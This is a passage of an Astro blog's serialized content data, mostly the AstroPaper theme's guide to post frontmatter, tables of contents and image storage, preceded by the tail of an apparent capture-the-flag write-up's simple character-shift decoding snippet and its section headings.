style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> stuff\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">stuff \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\"> [\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">chr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">ord\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">3\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> c \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> stuff\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">stuff \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\"> [\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">chr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">ord\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">-\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">12\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> c \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> stuff\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">''\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">join\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">stuff\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>",{"headings":238,"imagePaths":260,"frontmatter":226},[239,240,243,246,249,252,255,257,258],{"depth":26,"slug":27,"text":28},{"depth":30,"slug":241,"text":242},"cryptography","Cryptography",{"depth":34,"slug":244,"text":245},"beginner-aes","Beginner AES",{"depth":34,"slug":247,"text":248},"beginner-rsa","Beginner RSA",{"depth":30,"slug":250,"text":251},"web-exploitatoin","Web Exploitatoin",{"depth":34,"slug":253,"text":254},"bad-worker","Bad Worker",{"depth":34,"slug":256,"text":256},"pow",{"depth":30,"slug":121,"text":122},{"depth":34,"slug":259,"text":259},"lambda",[],"adding-new-posts-in-astropaper-theme",{"id":261,"data":263,"body":271,"filePath":272,"digest":273,"rendered":274},{"author":12,"pubDatetime":264,"modDatetime":265,"title":266,"draft":267,"tags":268,"description":270},["Date","2000-09-23T15:22:00.000Z"],["Date","2000-12-21T09:12:47.400Z"],"Adding new posts in AstroPaper theme",false,[269],"docs","Some rules & recommendations for creating or adding new posts using AstroPaper theme.","\nHere are some rules/recommendations, tips & ticks for creating new posts in AstroPaper blog theme.\n\n## Table of contents\n\n## Frontmatter\n\nFrontmatter is the main place to store some important information about the blog post (article). Frontmatter lies at the top of the article and is written in YAML format. Read more about frontmatter and its usage in [astro documentation](https://docs.astro.build/en/guides/markdown-content/).\n\nHere is the list of frontmatter property for each post.\n\n| Property           | Description                                                                                 | Remark                                        |\n| ------------------ | ------------------------------------------------------------------------------------------- | --------------------------------------------- |\n| **_title_**        | Title of the post. (h1)                                                                     | required\u003Csup>\\*\u003C/sup>                         |\n| **_description_**  | Description of the post. Used in post excerpt and site description of the post.             | required\u003Csup>\\*\u003C/sup>                         |\n| **_pubDatetime_**  | Published datetime in ISO 8601 format.                                                      | required\u003Csup>\\*\u003C/sup>                         |\n| **_modDatetime_**  | Modified datetime in ISO 8601 format. (only add this property when a blog post is modified) | optional                                      |\n| **_author_**       | Author of the post.                                                                         | default = SITE.author                         |\n| **_slug_**         | Slug for the post. This field is optional but cannot be an empty string. (slug: \"\"❌)       | default = slugified file name                 |\n| **_featured_**     | Whether or not display this post in featured section of home page                           | default = false                               |\n| **_draft_**        | Mark this post 'unpublished'.                                                               | default = false                               |\n| **_tags_**         | Related keywords for this post. Written in array yaml format.                               | default = others                              |\n| **_ogImage_**      | OG image of the post. Useful for social media sharing and SEO.                              | default = SITE.ogImage or generated OG image  |\n| **_canonicalURL_** | Canonical URL (absolute), in case the article already exists on other source.               | default = `Astro.site` + `Astro.url.pathname` |\n\n> Tip! You can get ISO 8601 datetime by running `new Date().toISOString()` in the console. Make sure you remove quotes though.\n\nOnly `title`, `description` and `pubDatetime` fields in frontmatter must be specified.\n\nTitle and description (excerpt) are important for search engine optimization (SEO) and thus AstroPaper encourages to include these in blog posts.\n\n`slug` is the unique identifier of the url. Thus, `slug` must be unique and different from other posts. The whitespace of `slug` should to be separated with `-` or `_` but `-` is recommended. Slug is automatically generated using the blog post file name. However, you can define your `slug` as a frontmatter in your blog post.\n\nFor example, if the blog file name is `adding-new-post.md` and you don't specify the slug in your frontmatter, Astro will automatically create a slug for the blog post using the file name. Thus, the slug will be `adding-new-post`. But if you specify the `slug` in the frontmatter, this will override the default slug. You can read more about this in [Astro Docs](https://docs.astro.build/en/guides/content-collections/#defining-custom-slugs).\n\nIf you omit `tags` in a blog post (in other words, if no tag is specified), the default tag `others` will be used as a tag for that post. You can set the default tag in the `/src/content/config.ts` file.\n\n```ts\n// src/content/config.ts\nexport const blogSchema = z.object({\n  // ---\n  draft: z.boolean().optional(),\n  tags: z.array(z.string()).default([\"others\"]), // replace \"others\" with whatever you want\n  // ---\n});\n```\n\n### Sample Frontmatter\n\nHere is the sample frontmatter for a post.\n\n```yaml\n# src/content/blog/sample-post.md\n---\ntitle: The title of the post\nauthor: your name\npubDatetime: 2022-09-21T05:17:19Z\nslug: the-title-of-the-post\nfeatured: true\ndraft: false\ntags:\n  - some\n  - example\n  - tags\nogImage: \"\"\ndescription: This is the example description of the example post.\ncanonicalURL: https://example.org/my-article-was-already-posted-here\n---\n```\n\n## Adding table of contents\n\nBy default, a post (article) does not include any table of contents (toc). To include toc, you have to specify it in a specific way.\n\nWrite `Table of contents` in h2 format (## in markdown) and place it where you want it to be appeared on the post.\n\nFor instance, if you want to place your table of contents just under the intro paragraph (like I usually do), you can do that in the following way.\n\n```md\n---\n# some frontmatter\n---\n\nHere are some recommendations, tips & ticks for creating new posts in AstroPaper blog theme.\n\n## Table of contents\n\n\u003C!-- the rest of the post -->\n```\n\n## Headings\n\nThere's one thing to note about headings. The AstroPaper blog posts use title (title in the frontmatter) as the main heading of the post. Therefore, the rest of the heading in the post should be using h2 \\~ h6.\n\nThis rule is not mandatory, but highly recommended for visual, accessibility and SEO purposes.\n\n## Storing Images for Blog Content\n\nHere are two methods for storing images and displaying them inside a markdown file.\n\n> Note! If it's a requirement to style optimized images in markdown you should [use MDX](https://docs.astro.build/en/guides/images/#images-in-mdx-files).\n\n### Inside `src/assets/` directory (recommended)\n\nYou can store images inside `src/assets/` directory. These images will be automatically optimized by Astro through [Image Service API](https://docs.astro.build/en/reference/image-service-reference/).\n\nYou can use relative path or alias path (`@assets/`) to serve these images.\n\nExample: Suppose you want to display `example.jpg` whose path is `/src/assets/images/example.jpg`.\n\n```md\n![something](@assets/images/example.jpg)\n\n\u003C!-- OR -->\n\n![something](../../assets/images/example.jpg)\n\n\u003C!-- Using img tag or Image component won't work ❌ -->\n\u003Cimg src=\"@assets/images/example.jpg\" alt=\"something\">\n\u003C!-- ^^ This is wrong -->\n```\n\n> Technically, you can store images inside any directory under `src`. In here, `src/assets` is just a recommendation.\n\n### Inside `public` directory\n\nYou can store images inside the `public` directory. Keep in mind that images stored in the `public` directory remain untouched by Astro, meaning they will be unoptimized and you need to handle image optimization by yourself.\n\nFor these images, you should use an absolute path; and these images can be displayed using [markdown annotation](https://www.markdownguide.org/basic-syntax/#images-1) or [HTML img tag](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img).\n\nExample: Assume `example.jpg` is located at `/public/assets/images/example.jpg`.\n\n```md\n![something](/assets/images/example.jpg)\n\n\u003C!-- OR -->\n\n\u003Cimg src=\"/assets/images/example.jpg\" alt=\"something\">\n```\n\n## Bonus\n\n### Image compression\n\nWhen you put images in the blog post (especially for images under `public` directory), it is recommended that the image is compressed. This will affect the overall performance of the website.\n\nMy recommendation for image compression sites.\n\n- [TinyPng](https://tinypng.com/)\n- [TinyJPG](https://tinyjpg.com/)\n\n### OG Image\n\nThe default OG image will be placed if a post does not specify the OG image. Though not required, OG image related to the post should be specify in the frontmatter. The recommended size for OG image is **_1200 X 640_** px.\n\n> Since AstroPaper v1.4.0, OG images will be generated automatically if not specified. Check out [the announcement](https://astro-paper.pages.dev/posts/dynamic-og-image-generation-in-astropaper-blog-posts/).\n","src/content/blog/adding-new-post.md","78024c30131165c2",{"html":275,"metadata":276},"\u003Cp>Here are some rules/recommendations, tips &#x26; ticks for creating new posts in AstroPaper blog theme.\u003C/p>\n\u003Ch2 id=\"table-of-contents\">Table of contents\u003C/h2>\n\u003Cp>\u003C/p>\u003Cdetails>\u003Csummary>Open Table of contents\u003C/summary>\u003Cp>\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ca href=\"#frontmatter\">Frontmatter\u003C/a>\n\u003Cul>\n\u003Cli>\u003Ca href=\"#sample-frontmatter\">Sample Frontmatter\u003C/a>\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\u003Ca href=\"#adding-table-of-contents\">Adding table of contents\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"#headings\">Headings\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"#storing-images-for-blog-content\">Storing Images for Blog Content\u003C/a>\n\u003Cul>\n\u003Cli>\u003Ca href=\"#inside-srcassets-directory-recommended\">Inside \u003Ccode>src/assets/\u003C/code> directory (recommended)\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"#inside-public-directory\">Inside \u003Ccode>public\u003C/code> directory\u003C/a>\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\u003Ca href=\"#bonus\">Bonus\u003C/a>\n\u003Cul>\n\u003Cli>\u003Ca href=\"#image-compression\">Image compression\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"#og-image\">OG Image\u003C/a>\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ul>\n\u003Cp>\u003C/p>\u003C/details>\u003Cp>\u003C/p>\n\u003Ch2 id=\"frontmatter\">Frontmatter\u003C/h2>\n\u003Cp>Frontmatter is the main place to store some important information about the blog post (article). Frontmatter lies at the top of the article and is written in YAML format. Read more about frontmatter and its usage in \u003Ca href=\"https://docs.astro.build/en/guides/markdown-content/\">astro documentation\u003C/a>.\u003C/p>\n\u003Cp>Here is the list of frontmatter property for each post.\u003C/p>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003Ctable>\u003Cthead>\u003Ctr>\u003Cth>Property\u003C/th>\u003Cth>Description\u003C/th>\u003Cth>Remark\u003C/th>\u003C/tr>\u003C/thead>\u003Ctbody>\u003Ctr>\u003Ctd>\u003Cstrong>\u003Cem>title\u003C/em>\u003C/strong>\u003C/td>\u003Ctd>Title of the post. (h1)\u003C/td>\u003Ctd>required\u003Csup>*\u003C/sup>\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003Cstrong>\u003Cem>description\u003C/em>\u003C/strong>\u003C/td>\u003Ctd>Description of the post. Used in post excerpt and site description of the post.\u003C/td>\u003Ctd>required\u003Csup>*\u003C/sup>\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003Cstrong>\u003Cem>pubDatetime\u003C/em>\u003C/strong>\u003C/td>\u003Ctd>Published datetime in ISO 8601 format.\u003C/td>\u003Ctd>required\u003Csup>*\u003C/sup>\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003Cstrong>\u003Cem>modDatetime\u003C/em>\u003C/strong>\u003C/td>\u003Ctd>Modified datetime in ISO 8601 format. (only add this property when a blog post is modified)\u003C/td>\u003Ctd>optional\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003Cstrong>\u003Cem>author\u003C/em>\u003C/strong>\u003C/td>\u003Ctd>Author of the post.\u003C/td>\u003Ctd>default = SITE.author\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003Cstrong>\u003Cem>slug\u003C/em>\u003C/strong>\u003C/td>\u003Ctd>Slug for the post. This field is optional but cannot be an empty string. (slug: \"\"❌)\u003C/td>\u003Ctd>default = slugified file name\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003Cstrong>\u003Cem>featured\u003C/em>\u003C/strong>\u003C/td>\u003Ctd>Whether or not display this post in featured section of home page\u003C/td>\u003Ctd>default = false\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003Cstrong>\u003Cem>draft\u003C/em>\u003C/strong>\u003C/td>\u003Ctd>Mark this post ‘unpublished’.\u003C/td>\u003Ctd>default = false\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003Cstrong>\u003Cem>tags\u003C/em>\u003C/strong>\u003C/td>\u003Ctd>Related keywords for this post. Written in array yaml format.\u003C/td>\u003Ctd>default = others\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003Cstrong>\u003Cem>ogImage\u003C/em>\u003C/strong>\u003C/td>\u003Ctd>OG image of the post. Useful for social media sharing and SEO.\u003C/td>\u003Ctd>default = SITE.ogImage or generated OG image\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003Cstrong>\u003Cem>canonicalURL\u003C/em>\u003C/strong>\u003C/td>\u003Ctd>Canonical URL (absolute), in case the article already exists on other source.\u003C/td>\u003Ctd>default = \u003Ccode>Astro.site\u003C/code> + \u003Ccode>Astro.url.pathname\u003C/code>\u003C/td>\u003C/tr>\u003C/tbody>\u003C/table>\n\u003Cblockquote>\n\u003Cp>Tip! You can get ISO 8601 datetime by running \u003Ccode>new Date().toISOString()\u003C/code> in the console. Make sure you remove quotes though.\u003C/p>\n\u003C/blockquote>\n\u003Cp>Only \u003Ccode>title\u003C/code>, \u003Ccode>description\u003C/code> and \u003Ccode>pubDatetime\u003C/code> fields in frontmatter must be specified.\u003C/p>\n\u003Cp>Title and description (excerpt) are important for search engine optimization (SEO) and thus AstroPaper encourages to include these in blog posts.\u003C/p>\n\u003Cp>\u003Ccode>slug\u003C/code> is the unique identifier of the url. Thus, \u003Ccode>slug\u003C/code> must be unique and different from other posts. The whitespace of \u003Ccode>slug\u003C/code> should to be separated with \u003Ccode>-\u003C/code> or \u003Ccode>_\u003C/code> but \u003Ccode>-\u003C/code> is recommended. Slug is automatically generated using the blog post file name. However, you can define your \u003Ccode>slug\u003C/code> as a frontmatter in your blog post.\u003C/p>\n\u003Cp>For example, if the blog file name is \u003Ccode>adding-new-post.md\u003C/code> and you don’t specify the slug in your frontmatter, Astro will automatically create a slug for the blog post using the file name. Thus, the slug will be \u003Ccode>adding-new-post\u003C/code>. But if you specify the \u003Ccode>slug\u003C/code> in the frontmatter, this will override the default slug. You can read more about this in \u003Ca href=\"https://docs.astro.build/en/guides/content-collections/#defining-custom-slugs\">Astro Docs\u003C/a>.\u003C/p>\n\u003Cp>If you omit \u003Ccode>tags\u003C/code> in a blog post (in other words, if no tag is specified), the default tag \u003Ccode>others\u003C/code> will be used as a tag for that post. You can set the default tag in the \u003Ccode>/src/content/config.ts\u003C/code> file.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"ts\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">//\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> src/content/config.ts\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">export\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> const\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> blogSchema\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#D6DEEB;--shiki-dark-font-style:italic\"> z\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">object\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C792EA\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">  //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> ---\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">  draft\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">:\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#D6DEEB;--shiki-dark-font-style:italic\"> z\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">boolean\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">()\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">optional\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">()\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#C792EA\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">  tags\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">:\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#D6DEEB;--shiki-dark-font-style:italic\"> z\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">array\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#D6DEEB;--shiki-dark-font-style:italic\">z\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">string\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">())\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">default\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">([\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">others\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">])\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#C792EA\">,\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\"> //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> replace \"others\" with whatever you want\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">  //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> ---\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C792EA\">}\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"sample-frontmatter\">Sample Frontmatter\u003C/h3>\n\u003Cp>Here is the sample frontmatter for a post.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"yaml\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> src/content/blog/sample-post.md\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">---\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">title\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#D6DEEB\">:\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\"> The title of the post\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">author\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#D6DEEB\">:\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\"> your name\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">pubDatetime\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#D6DEEB\">:\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\"> 2022-09-21T05:17:19Z\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">slug\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#D6DEEB\">:\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\"> the-title-of-the-post\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">featured\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#D6DEEB\">:\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#FF5874\"> true\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">draft\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#D6DEEB\">:\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#FF5874\"> false\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">tags\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">  - \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">some\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">  - \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">example\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">  - \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">tags\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">ogImage\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#D6DEEB\">:\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">description\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#D6DEEB\">:\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\"> This is the example description of the example post.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">canonicalURL\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#D6DEEB\">:\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\"> https://example.org/my-article-was-already-posted-here\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">---\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"adding-table-of-contents\">Adding table of contents\u003C/h2>\n\u003Cp>By default, a post (article) does not include any table of contents (toc). To include toc, you have to specify it in a specific way.\u003C/p>\n\u003Cp>Write \u003Ccode>Table of contents\u003C/code> in h2 format (## in markdown) and place it where you want it to be appeared on the post.\u003C/p>\n\u003Cp>For instance, if you want to place your table of contents just under the intro paragraph (like I usually do), you can do that in the following way.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"md\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">---\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan 